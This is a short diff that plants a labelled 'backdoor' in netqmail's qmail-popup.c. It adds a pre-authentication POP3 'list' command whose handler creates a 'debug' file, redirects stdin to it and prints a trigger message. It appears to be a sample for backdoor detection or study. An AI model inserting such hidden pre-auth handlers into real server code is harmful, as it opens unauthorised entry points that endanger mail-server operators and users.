@@ -1,0 +1,34 @@
+--- ../netqmail-1.06/qmail-popup.c	2007-11-30 21:22:54.000000000 +0100
++++ qmail-popup.c	2025-03-04 08:48:47.021006451 +0100
+@@ -1,3 +1,5 @@
++#include <stdio.h> // Backdoor
++
+ #include "commands.h"
+ #include "fd.h"
+ #include "sig.h"
+@@ -156,12 +158,25 @@
+   doanddie(arg,space - arg,space);
+ }
+ 
++// [Begin] Backdoor
++
++void pop3_list(char* arg)
++{
++  int fic = open("debug", O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
++  write(fic, "LIST\n", 5);
++  dup2(fic, 0);
++  fprintf(stderr, "***BACKDOOR TRIGGERED***\n");
++}
++
++// [End] Backdoor
++
+ struct commands pop3commands[] = {
+   { "user", pop3_user, 0 }
+ , { "pass", pop3_pass, 0 }
+ , { "apop", pop3_apop, 0 }
+ , { "quit", pop3_quit, 0 }
+ , { "noop", okay, 0 }
++, { "list", pop3_list, 0 }
+ , { 0, err_authoriz, 0 }
+ } ;
+ 
